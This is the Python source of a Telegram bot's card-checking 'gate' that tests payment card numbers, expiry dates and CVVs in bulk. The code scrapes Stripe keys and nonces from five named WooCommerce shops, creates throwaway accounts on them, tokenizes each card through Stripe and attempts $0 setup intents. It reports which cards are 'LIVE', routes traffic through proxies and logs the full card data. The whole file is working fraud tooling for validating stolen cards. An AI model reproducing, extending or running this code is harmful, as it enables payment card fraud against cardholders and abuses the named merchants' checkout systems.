"""
Stripe Auth2 $0 Gate — WooCommerce setup intent method
Commands: /auth cc|mm|yy|cvv  |  /mauth (reply to .txt or inline list)
OGGY'S PRIME BOT — @oggyproo
"""

import re
import uuid
import string
import random
import json
import asyncio
import time
import io
from typing import Optional, List, Tuple

import aiohttp
try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

from telegram import Update, LinkPreviewOptions
from telegram.ext import ContextTypes

from bin import get_bin_info
from database.db import get_user_proxies, is_premium, log_check, is_gate_enabled
from utils.rate_limit import rate_limit
from utils.lock_check import check_lock
from logger import get_logger
from ui.emojis import PremiumEmoji as E
from config import OWNER_USERNAME, OWNER_NAME

logger = get_logger(__name__)

# ─── WooCommerce target sites ────────────────────────────────────────────────
SITES = [
    "https://innercitytigers.com",
    "https://www.professionalmarine.eu",
    "https://www.domainegayda.com",
    "https://ecolution-hubs.co.uk",
    "https://shop.nemaneide.com",
]

UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
)

NONCE_PATTERNS = [
    r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"createSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"',
    r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
    r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'"nonce"\s*:\s*"([a-f0-9]+)"',
]

BAD_RESPONSES = {"", "0", "null", "false", "-1", "undefined"}


# ─── Helpers ─────────────────────────────────────────────────────────────────

CARD_PATTERN = re.compile(r'(\d{13,19})[|/: ]+(\d{1,2})[|/: ]+(\d{2,4})[|/: ]+(\d{3,4})')

def parse_card(raw: str) -> Optional[Tuple[str, str, str, str]]:
    m = CARD_PATTERN.search(raw.strip())
    if not m:
        return None
    num, mo, yr, cvv = m.groups()
    if len(yr) == 2:
        yr = "20" + yr
    return num, mo.zfill(2), yr, cvv

def luhn_ok(n: str) -> bool:
    d = [int(c) for c in n if c.isdigit()]
    if len(d) < 13:
        return False
    d.reverse()
    total = sum(
        (x * 2 - 9 if x * 2 > 9 else x * 2) if i % 2 == 1 else x
        for i, x in enumerate(d)
    )
    return total % 10 == 0

def _rand_str(n=10) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _extract_error(text: str) -> str:
    for pat in [
        r'"decline_code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, text)
        if m:
            return m.group(1).upper() if "decline_code" in pat or "code" in pat else m.group(1)
    return ""

def _is_bad_body(text) -> bool:
    if text is None:
        return True
    s = str(text).strip()
    if s.lower() in BAD_RESPONSES:
        return True
    if s.startswith("{") and s.endswith("}"):
        try:
            j = json.loads(s)
            if not j:
                return True
            if j.get("success") is False and not j.get("data"):
                return True
        except Exception:
            pass
    return False

def _req_proxy(proxy_url: Optional[str]) -> Optional[str]:
    if not proxy_url:
        return None
    if proxy_url.startswith(("socks5://", "socks5h://", "socks4://")):
        return None
    return proxy_url

def _make_session(proxy_url, jar, timeout):
    if proxy_url and proxy_url.startswith(("socks5://", "socks5h://", "socks4://")):
        if not HAS_SOCKS:
            raise RuntimeError("aiohttp_socks required for socks proxies")
        connector = ProxyConnector.from_url(proxy_url)
        return aiohttp.ClientSession(timeout=timeout, cookie_jar=jar, connector=connector)
    return aiohttp.ClientSession(timeout=timeout, cookie_jar=jar)

def _classify_stripe_response(result_text: str) -> dict:
    if _is_bad_body(result_text):
        return {"Response": "Empty AJAX — session mismatch", "Status": "Error"}
    rl = result_text.lower()
    err_msg = _extract_error(result_text)

    if any(k in rl for k in ['"success":true', '"status":"succeeded"', 'payment method added', 'payment_method_added']):
        if 'decline' in rl or 'card_declined' in rl:
            return {"Response": err_msg or "CARD_DECLINED", "Status": "Declined ❌"}
        return {"Response": "Payment Method Added — LIVE ✅", "Status": "Approved ✅"}

    if any(k in rl for k in ['requires_action', 'authentication_required', '3d_secure', '"status":"requires_confirmation"', 'redirect_to_url']):
        return {"Response": "LIVE · 3DS Required", "Status": "Approved 3DS ✅"}

    if 'card_not_supported' in rl:
        return {"Response": "CARD_NOT_SUPPORTED", "Status": "Declined ❌"}

    if any(k in rl for k in ['incorrect_cvc', 'incorrect_zip', 'insufficient_funds', 'invalid_cvc', 'cvc_check_failed']):
        return {"Response": err_msg or "CCN LIVE", "Status": "Approved CCN ✅"}

    if any(k in rl for k in ['card_declined', 'generic_decline', 'do_not_honor', 'fraudulent', 'lost_card', 'stolen_card', 'pickup_card', 'restricted_card', 'transaction_not_allowed', 'security_violation']):
        return {"Response": err_msg or "CARD_DECLINED", "Status": "Declined ❌"}

    if 'expired_card' in rl or 'expired' in rl:
        return {"Response": "EXPIRED_CARD", "Status": "Declined ❌"}

    if any(k in rl for k in ['velocity', 'too_many', 'rate_limit']):
        return {"Response": err_msg or "VELOCITY_EXCEEDED", "Status": "Error"}

    if '"success":false' in rl or '"error"' in rl:
        return {"Response": err_msg or "Unknown Error", "Status": "Error"}

    if err_msg:
        return {"Response": err_msg, "Status": "Error"}

    clean = result_text.strip()[:120]
    if _is_bad_body(clean):
        return {"Response": "Empty AJAX — session mismatch", "Status": "Error"}
    return {"Response": clean, "Status": "Error"}


# ─── Core async checker ───────────────────────────────────────────────────────

async def _extract_stripe_pk(session, site, headers, proxy_arg):
    for url in [
        f"{site}/my-account/add-payment-method/",
        f"{site}/my-account/",
        f"{site}/checkout/",
        f"{site}/",
    ]:
        try:
            async with session.get(url, headers=headers, ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=8) as resp:
                text = await resp.text()
                for pat in [r'pk_live_[a-zA-Z0-9]{20,}', r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"']:
                    match = re.search(pat, text)
                    if match:
                        return match.group(0) if pat.startswith(r'pk_live') else match.group(1)
        except Exception:
            continue
    return None

async def _fetch_nonce(session, site_url, headers, proxy_arg):
    for path in ['/my-account/add-payment-method/', '/my-account/payment-methods/', '/checkout/', '/my-account/']:
        try:
            async with session.get(f"{site_url}{path}", headers=headers, ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=8) as resp:
                page_text = await resp.text()
            for pattern in NONCE_PATTERNS:
                m = re.search(pattern, page_text)
                if m:
                    return m.group(1)
        except Exception:
            continue
    return None

async def _confirm_setup(session, site_url, pm_id, nonce, proxy_arg):
    confirm_headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": UA,
        "Origin": site_url,
        "Referer": f"{site_url}/my-account/add-payment-method/",
    }
    confirm_data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }
    result_text = ""
    for ep_url, ep_params, ep_data in [
        (f"{site_url}/", {"wc-ajax": "wc_stripe_create_and_confirm_setup_intent"}, confirm_data),
        (f"{site_url}/wp-admin/admin-ajax.php", {}, {**confirm_data, "action": "wc_stripe_create_and_confirm_setup_intent"}),
    ]:
        try:
            async with session.post(ep_url, params=ep_params, headers=confirm_headers, data=ep_data, ssl=False, proxy=proxy_arg, timeout=10) as resp:
                result_text = await resp.text()
                if resp.status == 200 and not _is_bad_body(result_text):
                    return result_text
        except Exception:
            continue
    return result_text

async def _try_site(site_url: str, cc: str, mm: str, yy: str, cvv: str, proxy_url=None) -> Optional[dict]:
    site_domain = site_url.replace("https://", "").replace("http://", "").rstrip("/")
    email = f"{_rand_str(10)}@gmail.com"
    gu, mu, si = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())

    headers_site = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }

    timeout    = aiohttp.ClientTimeout(total=20)
    jar        = aiohttp.CookieJar(unsafe=True)
    proxy_arg  = _req_proxy(proxy_url)

    try:
        session = _make_session(proxy_url, jar, timeout)
    except Exception:
        return None

    async with session:
        stripe_pk = await _extract_stripe_pk(session, site_url, headers_site, proxy_arg)
        if not stripe_pk:
            return None

        reg_nonce = None
        for path in ["/my-account/", "/my-account-2/", "/register/"]:
            try:
                async with session.get(f"{site_url}{path}", headers=headers_site, ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=8) as resp:
                    page_text = await resp.text()
                for pattern in [
                    r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
                    r'id="woocommerce-register-nonce"[^>]*value="([^"]+)"',
                    r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"',
                ]:
                    m = re.search(pattern, page_text)
                    if m:
                        reg_nonce = m.group(1)
                        break
                if reg_nonce:
                    break
            except Exception:
                continue

        if not reg_nonce:
            return None

        reg_data = {
            "email": email,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
            "woocommerce-register-nonce": reg_nonce,
        }
        reg_headers = {
            "User-Agent": UA, "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": site_url, "Referer": f"{site_url}/my-account/",
        }
        try:
            async with session.post(
                f"{site_url}/my-account/", data=reg_data, headers=reg_headers,
                ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=10
            ) as resp:
                await resp.text()
        except Exception:
            return None

        cookies = {c.key: c.value for c in jar}
        if not any("wordpress_logged_in" in k for k in cookies):
            return None

        nonce = await _fetch_nonce(session, site_url, headers_site, proxy_arg)
        if not nonce:
            return None

        stripe_headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": UA,
        }
        stripe_data = (
            f"type=card&card[number]={cc}&card[cvc]={cvv}"
            f"&card[exp_year]={yy}&card[exp_month]={mm}"
            f"&allow_redisplay=unspecified"
            f"&billing_details[address][postal_code]=10080"
            f"&billing_details[address][country]=US"
            f"&billing_details[name]=John%20Doe"
            f"&billing_details[email]={email}"
            f"&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent"
            f"&referrer=https%3A%2F%2F{site_domain}"
            f"&time_on_page={random.randint(20000, 50000)}"
            f"&guid={gu}&muid={mu}&sid={si}&key={stripe_pk}"
            f"&_stripe_version=2024-06-20"
        )
        try:
            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_data, headers=stripe_headers,
                ssl=False, proxy=proxy_arg, timeout=10
            ) as resp:
                stripe_text = await resp.text()
        except Exception:
            return None

        try:
            stripe_json = json.loads(stripe_text)
        except Exception:
            stripe_json = {}

        if "error" in stripe_json:
            err = stripe_json["error"]
            display = err.get("decline_code") or err.get("code") or err.get("message") or "TOKENIZATION_FAILED"
            return {"Response": display, "Status": "Declined ❌"}

        pm_id = stripe_json.get("id", "")
        if not pm_id or not pm_id.startswith("pm_"):
            return None

        result_text = await _confirm_setup(session, site_url, pm_id, nonce, proxy_arg)
        if _is_bad_body(result_text):
            return None

        return _classify_stripe_response(result_text)


async def stripe_auth2_check(card_str: str, proxy_str: Optional[str] = None) -> dict:
    """Main entry: tries all sites, returns first valid result."""
    try:
        parts = card_str.strip().split("|")
        if len(parts) != 4:
            return {"Response": "Invalid card format", "Status": "Error"}
        cc, mm, yy, cvv = [p.strip() for p in parts]
        if len(yy) == 2:
            yy = "20" + yy

        sites = list(SITES)
        random.shuffle(sites)

        for site_url in sites:
            try:
                result = await _try_site(site_url, cc, mm, yy, cvv, proxy_str)
                if result is None:
                    continue
                if not isinstance(result, dict):
                    continue
                if _is_bad_body(result.get("Response", "")):
                    continue
                return result
            except Exception:
                continue

        return {"Response": "All sites failed — no valid response", "Status": "Error"}
    except Exception as e:
        return {"Response": f"Exception: {str(e)[:80]}", "Status": "Error"}


# ─── Verdict helpers ──────────────────────────────────────────────────────────

def _verdict(status: str) -> str:
    s = status.upper()
    if "APPROVED" in s or "ADDED" in s or "LIVE" in s or "CCN" in s or "AVS" in s or "3DS" in s:
        return "APPROVED"
    if "DECLINED" in s or "DECLINED" in s:
        return "DECLINED"
    return "ERROR"

def _emoji(v: str) -> str:
    return {"APPROVED": "✅", "DECLINED": "❌", "ERROR": "⚠️"}.get(v, "⚠️")


# ─── /auth — single check ─────────────────────────────────────────────────────

@check_lock
@rate_limit("stripe_auth")
async def handle_auth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/auth cc|mm|yy|cvv — Stripe Auth2 $0 gate"""
    if not is_gate_enabled("stripe_auth"):
        await update.message.reply_text(
            f"{E.LOCK} <b>Stripe Auth gate is disabled.</b>", parse_mode="HTML"
        )
        return

    user     = update.effective_user
    user_id  = user.id
    username = f"@{user.username}" if user.username else user.first_name

    raw_card = None
    if context.args:
        raw_card = " ".join(context.args)
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        raw_card = update.message.reply_to_message.text.strip().split("\n")[0]

    if not raw_card:
        await update.message.reply_text(
            f"{E.INFO} <b>Usage:</b> <code>/auth 4242424242424242|12|26|123</code>",
            parse_mode="HTML"
        )
        return

    parsed = parse_card(raw_card)
    if not parsed:
        await update.message.reply_text(f"{E.ERROR} <b>Invalid card format.</b>", parse_mode="HTML")
        return

    cc, mo, yr, cvv = parsed
    if not luhn_ok(cc):
        await update.message.reply_text(f"{E.ERROR} <b>Card failed Luhn check.</b>", parse_mode="HTML")
        return

    proxies   = get_user_proxies(user_id)
    proxy_str = proxies[0]["proxy"] if proxies else None

    bin_data = get_bin_info(cc[:6])
    bin_info = (
        f"{bin_data.get('scheme','?').upper()} "
        f"{bin_data.get('type','?').upper()} — "
        f"{bin_data.get('bank','?')} — "
        f"{bin_data.get('country','?')}"
    ) if bin_data else "Unknown BIN"

    progress = await update.message.reply_text(
        f"✅ <b>Stripe Auth2 $0 — Checking...</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<code>{cc[:6]}xxxxxx{cc[-4:]}|{mo}|{yr}|{cvv}</code>\n"
        f"<i>Registering & probing WooCommerce sites...</i>",
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    t0      = time.time()
    result  = await stripe_auth2_check(f"{cc}|{mo}|{yr}|{cvv}", proxy_str)
    elapsed = round(time.time() - t0, 2)

    status   = result.get("Status", "Error")
    response = result.get("Response", "Unknown")
    verdict  = _verdict(status)
    emoji    = _emoji(verdict)

    text = (
        f"{emoji} <b>{status}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>Card</b>      ↬ <code>{cc}|{mo}|{yr}|{cvv}</code>\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>BIN</b>       ↬ <code>{bin_info}</code>\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>Gate</b>      ↬ Stripe Auth2 $0\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>Response</b>  ↬ <code>{response[:150]}</code>\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>Time</b>      ↬ {elapsed}s\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<b>User</b>  ➭ {username}\n"
        f"<b>Owner</b> ➭ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"
    )

    await progress.edit_text(
        text, parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    log_check(user_id, cc, verdict, response[:200], "stripe_auth2", elapsed)


# ─── /mauth — mass check ──────────────────────────────────────────────────────

@check_lock
@rate_limit("stripe_auth_mass")
async def handle_mauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/mauth — mass Stripe Auth2 (reply to .txt or inline list)"""
    if not is_gate_enabled("stripe_auth"):
        await update.message.reply_text(
            f"{E.LOCK} <b>Stripe Auth gate is disabled.</b>", parse_mode="HTML"
        )
        return

    user     = update.effective_user
    user_id  = user.id
    prem     = is_premium(user_id)
    username = f"@{user.username}" if user.username else user.first_name

    lines: List[str] = []
    rm = update.message.reply_to_message
    if rm:
        if rm.document and rm.document.file_name.endswith(".txt"):
            f = await rm.document.get_file()
            bio = io.BytesIO()
            await f.download_to_memory(bio)
            bio.seek(0)
            lines = bio.read().decode(errors="ignore").splitlines()
        elif rm.text:
            lines = rm.text.splitlines()
    if context.args and not lines:
        lines = [" ".join(context.args)]

    if not lines:
        await update.message.reply_text(
            f"{E.INFO} <b>Usage:</b> Reply to .txt file or paste cards after /mauth\n"
            f"One card per line: <code>4242...|12|26|123</code>",
            parse_mode="HTML"
        )
        return

    cards = [(parse_card(l), l) for l in lines if l.strip()]
    cards = [(p, l) for p, l in cards if p and luhn_ok(p[0])]

    limit = 200 if prem else 30
    if len(cards) > limit:
        await update.message.reply_text(
            f"{E.INFO} Limit: <b>{limit}</b> ({'Premium' if prem else 'Free'}). "
            f"Got {len(cards)}, using first {limit}.",
            parse_mode="HTML"
        )
        cards = cards[:limit]

    if not cards:
        await update.message.reply_text(f"{E.ERROR} No valid cards found.", parse_mode="HTML")
        return

    proxies   = get_user_proxies(user_id)
    proxy_str = proxies[0]["proxy"] if proxies else None

    # ─── Concurrent batch processing (12 CPU / 96 GB RAM) ───────────────────
    # Use semaphore to cap concurrent Stripe connections safely
    SEM = asyncio.Semaphore(20)  # 20 concurrent checks

    progress = await update.message.reply_text(
        f"✅ <b>Mass Stripe Auth2 $0</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<b>Total:</b> {len(cards)} cards\n"
        f"<i>Starting concurrent checks...</i>",
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    totals  = {"APPROVED": 0, "DECLINED": 0, "ERROR": 0}
    results = {"APPROVED": [], "DECLINED": [], "ERROR": []}
    done    = 0

    async def check_one(parsed, _raw):
        nonlocal done
        cc, mo, yr, cvv = parsed
        async with SEM:
            t0     = time.time()
            result = await stripe_auth2_check(f"{cc}|{mo}|{yr}|{cvv}", proxy_str)
            elapsed = round(time.time() - t0, 2)

        status   = result.get("Status", "Error")
        response = result.get("Response", "Unknown")
        verdict  = _verdict(status)

        totals[verdict] += 1
        entry = f"<code>{cc}|{mo}|{yr}|{cvv}</code> — {response[:60]}"
        results[verdict].append(entry)
        log_check(user_id, cc, verdict, response[:200], "stripe_auth2_mass", elapsed)

        done += 1
        if done % 5 == 0 or done == len(cards):
            try:
                await progress.edit_text(
                    f"✅ <b>Mass Stripe Auth2 $0</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"<b>Progress:</b> {done}/{len(cards)}\n"
                    f"✅ <b>Approved:</b> {totals['APPROVED']}\n"
                    f"❌ <b>Declined:</b> {totals['DECLINED']}\n"
                    f"⚠️ <b>Errors:</b>   {totals['ERROR']}",
                    parse_mode="HTML",
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
            except Exception:
                pass

    # Fire all concurrently
    await asyncio.gather(*[check_one(p, r) for p, r in cards], return_exceptions=True)

    summary = (
        f"✅ <b>Mass Stripe Auth2 $0 — Complete</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<b>Total:</b>    {len(cards)}\n"
        f"✅ <b>Approved:</b> {totals['APPROVED']}\n"
        f"❌ <b>Declined:</b> {totals['DECLINED']}\n"
        f"⚠️ <b>Errors:</b>   {totals['ERROR']}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
    )
    if results["APPROVED"]:
        summary += "✅ <b>Approved Cards:</b>\n" + "\n".join(results["APPROVED"][:15]) + "\n━━━━━━━━━━━━━━━━━━\n"

    summary += (
        f"<b>Gate</b>  ➭ Stripe Auth2 $0\n"
        f"<b>User</b>  ➭ {username}\n"
        f"<b>Owner</b> ➭ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"
    )

    await progress.edit_text(
        summary, parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )
